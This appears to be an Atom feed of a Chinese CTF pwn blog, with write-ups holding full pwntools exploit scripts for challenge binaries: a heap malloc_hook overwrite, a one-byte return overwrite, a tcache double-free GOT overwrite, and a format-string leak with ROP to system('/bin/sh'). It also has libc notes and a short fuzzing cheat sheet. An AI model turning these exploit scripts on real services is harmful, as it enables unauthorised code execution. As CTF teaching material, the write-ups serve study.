class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">io=None</span><br><span class="line">__author__ = &apos;3summer&apos;</span><br><span class="line">s       = lambda data            :io.send(str(data))</span><br><span class="line">sa      = lambda delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data            :io.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda numb=4096       :io.recv(numb)</span><br><span class="line">ru      = lambda delims,drop=True:io.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                  :io.interactive()</span><br><span class="line">uu32    = lambda data            :u32(data.ljust(4, &apos;\0&apos;))</span><br><span class="line">uu64    = lambda data            :u64(data.ljust(8, &apos;\0&apos;))</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">token = &apos;&apos;</span><br><span class="line">binary=&apos;./pwn&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">def dbg(breakpoint):</span><br><span class="line">    gdbscript = &apos;&apos;</span><br><span class="line">    elf_base = 0</span><br><span class="line">    gdbscript += &apos;b *&#123;:#x&#125;\n&apos;.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint</span><br><span class="line">    gdbscript += &apos;c\n&apos;</span><br><span class="line">    log.info(gdbscript)</span><br><span class="line">    gdb.attach(io, gdbscript)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sla(&apos;choice:&apos;,1)</span><br><span class="line">sla(&apos;size&apos;,size)</span><br><span class="line">sa(&apos;inpute&apos;,con)</span><br><span class="line">def rm(index):</span><br><span class="line">sla(&apos;choice:&apos;,str(4))</span><br><span class="line">sla(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def exploit(io):</span><br><span class="line">sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">ru(&apos;a&apos;*8)</span><br><span class="line">libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br><span class="line">malloc_hook=libc_base+libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">free_hook=libc_base+libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">system=libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">bin_sh=libc_base+0x000000000018cd57</span><br><span class="line">pop_rdi=libc_base+0x0000000000021102</span><br><span class="line">print &apos;libc=&apos;+hex(libc_base)</span><br><span class="line">add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">rm(2)</span><br><span class="line">rm(0)</span><br><span class="line">rm(1)</span><br><span class="line">rm(0)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">       add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">try:</span><br><span class="line">add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">except:</span><br><span class="line">io.close()</span><br><span class="line">io=main()</span><br><span class="line">exploit(io)</span><br><span class="line">print &apos;heap start 0x56 you win&apos;</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">add(0x30,p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line">def main(argv=None):</span><br><span class="line">global io</span><br><span class="line">if argv==None:</span><br><span class="line">argv=sys.argv</span><br><span class="line">if len(argv) &gt; 2:</span><br><span class="line">        io = remote(sys.argv[1], sys.argv[2])</span><br><span class="line">return io</span><br><span class="line"> else:</span><br><span class="line">        io = process(binary)</span><br><span class="line">if len(argv)&gt;1:</span><br><span class="line">                gdb.attach(io,&apos;directory /home/pwn/libc/glibc-2.23/malloc/&apos;)</span><br><span class="line">return io</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    io= main()</span><br><span class="line">    exploit(io)</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure><h2 id="fix-it"><a href="#fix-it" class="headerlink" title="fix it"></a>fix it</h2><p>这个漏洞攻击完了但是如何修复呢？</p><p>ida的keypatch插件很好用，一般的话程序的.eh_frame段，一般程序运行的话，不需要这一段的数据，在这一段找一小段没有被引用的段写入汇编程序，然后就可以fix好了</p><p>对于这个题目只需要把指针置0就可以了,本题只需要jmp一小段汇编程序即可<br><img src="/2019/06/06/top-chunk/top-chunk/patch.png" alt=""></p><p><img src="/2019/06/06/top-chunk/top-chunk/patch1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;libc源码分析&#39;</title>
    <link href="http://yoursite.com/2019/05/27/libc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/27/libc源码分析/</id>
    <published>2019-05-27T13:22:02.000Z</published>
    <updated>2019-09-17T16:14:54.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><h2 id="0x00-虚拟机环境"><a href="#0x00-虚拟机环境" class="headerlink" title="0x00 虚拟机环境"></a>0x00 虚拟机环境</h2><ul><li>虚拟机环境 ubuntu16.04 x86_64<h2 id="0x01-libc版本"><a href="#0x01-libc版本" class="headerlink" title="0x01 libc版本"></a>0x01 libc版本</h2></li><li>ibc版本的话是 <strong>2.23amd64</strong> 之所以选择这个版本，是因为Ubuntu16.04的 libc的版本是2.23，这样的话，免去你做libc版本控制这一步， 因为正常编译一个程序的话，默认链接的libc.so.6的位置的是固定的，可以用 <strong>ldd</strong> 查询libc.so.6位置<br><img src="/2019/05/27/libc源码分析/ldd.png" alt=""><br>可以看到libc链接的路径是 <strong>/lib/x86_64-linux-gnu/libc.so.6</strong> 进入这个目录看一下 <strong>libc.so.6</strong><br><img src="/2019/05/27/libc源码分析/libc.png" alt=""><br>发现 <strong>libc.so.6是当前文件夹下libc-2.23.so</strong> 的链接<h2 id="0x02-让程序执行你所期望的libc的版本"><a href="#0x02-让程序执行你所期望的libc的版本" class="headerlink" title="0x02 让程序执行你所期望的libc的版本"></a>0x02 让程序执行你所期望的libc的版本</h2>如果想要程序链接你期望的libc版本一般方式有两种：</li><li>就是改环境变量输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=$PATH //$PATH为你想要链接的libc的版本的文件的绝对路径</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x01-malloc分析"><a href="#0x01-malloc分析" class="headerlink" title="0x01 malloc分析"></a>0x01 malloc分析</h1><p>malloc()函数首先会在fastbin链表中查询有没有合适的size的chunk，</p><h1 id="0x02-free分析"><a href="#0x02-free分析" class="headerlink" title="0x02 free分析"></a>0x02 free分析</h1>]]></content>
    
    <summary type="html">
    
      自从pwn入门之后，就进度缓慢，虽然有很多不能理解，也不知道为什么能这么利用，所以，今天做一下libc源码的分析，主要分析一下malloc和free的过程，以及puts和printf的过程
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;未解决为题&#39;</title>
    <link href="http://yoursite.com/2019/04/23/%E6%9C%AA%E8%A7%A3%E5%86%B3%E4%B8%BA%E9%A2%98/"/>
    <id>http://yoursite.com/2019/04/23/未解决为题/</id>
    <published>2019-04-23T11:43:02.000Z</published>
    <updated>2019-09-15T07:44:35.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>西湖论剑第三题，libc 源代码分析</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>通过爆破修改alarm@got最低位指向sysenter从而判断远程libc版本，再利用read()使得eax=sys_write即可泄露 原理</p>]]></content>
    
    <summary type="html">
    
      这里总结一下，pwn中没有解决的问题
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;永信杯wp&#39;</title>
    <link href="http://yoursite.com/2019/04/13/%E6%B0%B8%E4%BF%A1%E6%9D%AFwp/"/>
    <id>http://yoursite.com/2019/04/13/永信杯wp/</id>
    <published>2019-04-13T09:14:00.000Z</published>
    <updated>2019-09-15T07:44:35.264Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接<a href="https://pan.baidu.com/s/19xe2tWAeMFRJ9Z27zGbYEQ" target="_blank" rel="noopener"></a></p><p>提取码：9vxl</p><h1 id="0x00-checkin"><a href="#0x00-checkin" class="headerlink" title="0x00 checkin"></a>0x00 checkin</h1><h2 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>签到题目直接 <strong>输入cat flag</strong> 命令就可以了</p><h1 id="0x01-ret2moon"><a href="#0x01-ret2moon" class="headerlink" title="0x01 ret2moon"></a>0x01 ret2moon</h1><h2 id="0x0-思路"><a href="#0x0-思路" class="headerlink" title="0x0 思路"></a>0x0 思路</h2><h3 id="0x00-checksec"><a href="#0x00-checksec" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/checksec.png" alt=""></p><p>基本保护全开了</p><h3 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><p><img src="/2019/04/13/永信杯wp/ida_input.png" alt=""><br>由于 <strong>buf的位置</strong> 在 <strong>rbp-0x30</strong> 的位置，但是你能输入 <strong>0x50</strong> 个字节 所以你能控制index arrary的值，最后的效果是允许你修改相对于 <strong>rbp</strong> 任意address。修改1byte,我们再看main函数<br><img src="/2019/04/13/永信杯wp/main.png" alt=""></p><p>这个 <strong>return address</strong> 我们可以控制 <strong>1byte</strong> 而 <strong>main</strong> 函数的下面就是 <strong>backdoor</strong> 函数,也就是<br><img src="/2019/04/13/永信杯wp/backdoor.png" alt=""><br>我们跳转到这里就能 <strong>get shell</strong></p><h3 id="0x02-具体做法"><a href="#0x02-具体做法" class="headerlink" title="0x02 具体做法"></a>0x02 具体做法</h3><p>将 <strong>input_buf</strong> 的 <strong>return</strong> 的最低的一个byte 改为  <strong>E8</strong><br><img src="/2019/04/13/永信杯wp/exp.png" alt=""></p><h2 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h2><p>一开始分析 <strong>input_buf</strong> 函数的时候，由于伪代码不太很好看，所以去分析汇编，就不太记得 <strong>index</strong> 是指针了，所以，以为 <strong>index</strong> 为一个index变量值，因为，<strong>index</strong> 的值是在你输入buf之前复制的，所以我一度认为，无法控制 <strong>index</strong> 的值,从而不能实现 <strong>任意address</strong> 的写入，之后才看到 <strong>index的类型</strong> 是 <strong>指针</strong> ，卡了好久</p><h2 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">r=remote(&apos;211.65.197.117&apos;,10006)</span><br><span class="line">#r=process(&apos;./ret2moon&apos;)</span><br><span class="line">payload=&apos;&apos;</span><br><span class="line">payload=&apos;b&apos;*0x10+p64(0x30+8)</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">r.sendlineafter(&apos;wake&apos;,payload)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">oneword=p8(0xE8)</span><br><span class="line">r.sendlineafter(&apos;word&apos;,oneword)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-tcache-pwn"><a href="#0x02-tcache-pwn" class="headerlink" title="0x02 tcache_pwn"></a>0x02 tcache_pwn</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目没有时间做了，发现了 <strong>double free</strong> 还没来得及细想，比赛已经结束了，经过了一上午终于做出来了，其实 <strong>tcache</strong> 机制还是挺有意思的，虽然我没有系统去研究过它，但是通过一些文章对 <strong>tcache</strong> 机制的介绍， 我对它有了一定的了解，具体可以参照</p><p><a href="https://www.360zhijia.com/anquan/371580.html" target="_blank" rel="noopener">由一道CTF pwn题深入理解libc2.26中的tcache机制</a></p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><h3 id="0x00-checksec-1"><a href="#0x00-checksec-1" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/tcache_checksec.png" alt=""></p><h3 id="0x01-漏洞点-1"><a href="#0x01-漏洞点-1" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><p><img src="/2019/04/13/永信杯wp/tcache_del.png" alt=""><br>漏洞点在 <strong>detele()</strong> 这个函数里面,由于free的指针没有清零，可以 <strong>double free</strong></p><h3 id="0x02-具体做法-1"><a href="#0x02-具体做法-1" class="headerlink" title="0x02 具体做法"></a>0x02 具体做法</h3><p>首先 <strong>leak libc address</strong> ，然将 <strong>got表的free函数的addres 改成 system的address</strong>，最后,添加一个 <strong>chunk</strong>,内容为 <strong>/bin/sh\0</strong> , <strong>free(chunk)</strong> 其实，实际的结果是执行 <strong>system(“bin/sh”)</strong></p><h2 id="0x2-遇到的问题"><a href="#0x2-遇到的问题" class="headerlink" title="0x2 遇到的问题"></a>0x2 遇到的问题</h2><p>遇到的最大的问题是第一次 <strong>double free</strong> 可以成功，第二次却失败了。究其原因，是由于 <strong>tcache</strong> 机制的特性,free掉的chunk，会首先进入 <strong>tcachebins</strong> 里面，<strong>tcachebins</strong> 基本不做检查，所以你可以 <strong>连续free两次同一个chunk</strong> 那这样的话，你首先 <strong>malloc</strong> 3次，第三个chunk应该就是你想要得到的那个chunk，第四次malloc，还会得到你delete 的那个 chunk ，第五次malloc 你会得到第二次malloc时你填入的内容作为地址去malloc，如果这个地址你是任意填的，那么就会 <strong>crash</strong> ,我就在在这里卡了很久</p><h2 id="0x03-exploit-1"><a href="#0x03-exploit-1" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#r=remote(&apos;192.168.43.150&apos;,8888)</span><br><span class="line">#r=process(&apos;./tcache_pwn&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">def add(length,con):</span><br><span class="line">r.sendlineafter(&apos;your choice&gt;&apos;,str(1))</span><br><span class="line">r.sendlineafter(&apos;length&apos;,str(length))</span><br><span class="line">r.sendafter(&apos;flag&apos;,con)</span><br><span class="line">def put(index):</span><br><span class="line">r.sendlineafter(&apos;your choice&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">def delete(index):</span><br><span class="line">r.sendlineafter(&apos;your choice&gt;&apos;,str(3))</span><br><span class="line">r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">#raw_input(&apos;#&apos;)</span><br><span class="line">add(0x50,&apos;xxxx&apos;)</span><br><span class="line">add(0x50,&apos;xxxx&apos;)</span><br><span class="line">add(0x50,&apos;/bin/sh\0&apos;)</span><br><span class="line">raw_input(&apos;1&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">add(0x50,p64(0x6012A0))</span><br><span class="line">add(0x50,p64(0x601228))</span><br><span class="line">add(0x50,p64(0x601228))</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">#raw_input(&apos;xx&apos;)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">r.recv()</span><br><span class="line">put(0)</span><br><span class="line">free_addr=u64(r.recvuntil(&apos;ok&apos;)[1:7].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;add=&apos;+hex(free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[&apos;free&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">add(0x50,&apos;xxx&apos;)</span><br><span class="line">add(0x50,p64(system_addr))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3-pwn-collection"><a href="#0x3-pwn-collection" class="headerlink" title="0x3 pwn_collection"></a>0x3 pwn_collection</h1><h2 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目就差一点就做出来了，由于自己 <strong>rop功底差</strong>，导致只知道用 <strong>one_gadget</strong> 去 <strong>getshell</strong> ,然而当 <strong>onegadget</strong> 失效的时候，就毫无头绪了，所以，最后一步走不出去，很难受。</p><h2 id="0x01-思路-1"><a href="#0x01-思路-1" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><h3 id="0x00-checksec-2"><a href="#0x00-checksec-2" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/pwn_checksec.png" alt=""><br>没有 <strong>PIE</strong> 和 <strong>canary</strong> 可以考虑 <strong>rop</strong></p><h3 id="0x01-函数功能"><a href="#0x01-函数功能" class="headerlink" title="0x01 函数功能"></a>0x01 函数功能</h3><p>函数有好多，做一个图表<br><img src="/2019/04/13/永信杯wp/pwn_fun.png" alt=""></p><h3 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h3><p>这个程序漏洞有两个，也许不止两个，但是两个漏洞已经够用了</p><h4 id="0x00-rop"><a href="#0x00-rop" class="headerlink" title="0x00 rop"></a>0x00 rop</h4><p><img src="/2019/04/13/永信杯wp/pwn_login.png" alt=""><br>这个漏洞发生在 <strong>login</strong> 函数中，我们可以看到 <strong>v1</strong> 的位置在 <strong>rbp-30h</strong> 但是它却允许你输入 <strong>0x50</strong> 个字节，造成栈溢出，可以实现 <strong>任意address跳转</strong></p><h4 id="0x00-format-string"><a href="#0x00-format-string" class="headerlink" title="0x00 format string"></a>0x00 format string</h4><p><img src="/2019/04/13/永信杯wp/pwn_show.png" alt=""><br>我可以看到这个函数是直接 <strong>printf((&amp;note_point)[index], &amp;index)</strong> 而 <strong>note_point</strong> 是存储指向 <strong>heap</strong> 的指针的数组，如果我们我们的 <strong>note</strong> 的内容为 <strong>%lx，%lx,%lx，%lx…</strong> 它就会打印栈上的内容</p><h3 id="0x03-具体做法"><a href="#0x03-具体做法" class="headerlink" title="0x03 具体做法"></a>0x03 具体做法</h3><p>format string触发的时候，很幸运，栈上有我们的想要的地址。<br><img src="/2019/04/13/永信杯wp/pwn_leak.png" alt=""><br>算一下 <strong>offset</strong> 就可以得到 <strong>libc_base</strong> 之后就 <strong>call system（）</strong> 或者 跳 <strong>one_gadget address</strong></p><h2 id="0x02-遇到问题"><a href="#0x02-遇到问题" class="headerlink" title="0x02 遇到问题"></a>0x02 遇到问题</h2><p>最大的问题是 <strong>one_gadget</strong> 坏掉了，所以，就需要 <strong>call system()</strong> 但是，控制参数，我就毫无头绪了，最后，卡在这里，没做出来。之后，问出题人，出题人师傅说，直接在 <strong>lib.so</strong> 里面找 <strong>pop edi</strong> 的 <strong>gadget</strong> 就可以了，学到了</p><h2 id="0x03-exploit-2"><a href="#0x03-exploit-2" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#r=remote(&apos;211.65.197.117&apos;,10008)</span><br><span class="line">r=process(&apos;./pwn_collection&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">def reg(name,passwd):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(1))</span><br><span class="line">r.sendlineafter(&apos;\n&gt;&apos;,name)</span><br><span class="line">r.sendlineafter(&apos;\n&gt;&apos;,passwd)</span><br><span class="line">def login(index,passwd):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">r.sendlineafter(&apos;\n&gt;&apos;,passwd)</span><br><span class="line">def delete(index):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(3))</span><br><span class="line">r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">def add(length,con):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(1))</span><br><span class="line">r.sendlineafter(&apos;length&apos;,str(length))</span><br><span class="line">r.sendlineafter(&apos;note&apos;,con)</span><br><span class="line">def put(index):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;idx&apos;,str(index))</span><br><span class="line">def dele(index):</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,str(3))</span><br><span class="line">r.sendlineafter(&apos;idx&apos;,str(index))</span><br><span class="line">reg(&apos;a&apos;,&apos;a&apos;)</span><br><span class="line">login(0,&apos;a&apos;)</span><br><span class="line">payload=&apos;%lx,&apos;*20</span><br><span class="line">#raw_input(&apos;###&apos;)</span><br><span class="line">add(0x55,payload)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line"></span><br><span class="line">put(0)</span><br><span class="line">r.recvuntil(&apos;\n&apos;)</span><br><span class="line">put_addr=int(r.recvuntil(&apos;\n&apos;)[84:96],16)-362</span><br><span class="line">print &apos;put_addr=&apos;+hex(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;libc_base=&apos;+hex(libc_base)</span><br><span class="line">pop_edi=libc_base+0x21102</span><br><span class="line">bin_sh= 0x18cd57+libc_base</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,&apos;4&apos;)</span><br><span class="line">payload1=&apos;&apos;</span><br><span class="line">payload1+=&apos;\x00&apos;*(0x30)+&apos;a&apos;*8+p64(pop_edi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">login(0,payload1)</span><br><span class="line">raw_input(&apos;####&apos;)</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,&apos;4&apos;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里总结一下永信杯wp
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;pwn常规操作&#39;</title>
    <link href="http://yoursite.com/2019/04/09/pwn%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2019/04/09/pwn常规操作/</id>
    <published>2019-04-09T14:43:59.000Z</published>
    <updated>2019-09-15T07:44:35.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-查找libc中的字串"><a href="#0x00-查找libc中的字串" class="headerlink" title="0x00 查找libc中的字串"></a>0x00 查找libc中的字串</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -tx ./libc.so |grep /bin/sh</span><br></pre></td></tr></table></figure><h1 id="0x01-afi-fuzz的使用"><a href="#0x01-afi-fuzz的使用" class="headerlink" title="0x01 afi-fuzz的使用"></a>0x01 afi-fuzz的使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">建立两个文件夹in和out</span><br><span class="line">tee in/a.txt|./pwn</span><br><span class="line">./afl-2.52b/afl-fuzz -i in -o out -Q -- ./noinfoleak</span><br></pre></td></tr></table></figure><h1 id="0x02-alarm函数的替换"><a href="#0x02-alarm函数的替换" class="headerlink" title="0x02 alarm函数的替换"></a>0x02 alarm函数的替换</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./shellcode</span><br></pre></td></tr></table></figure><h1 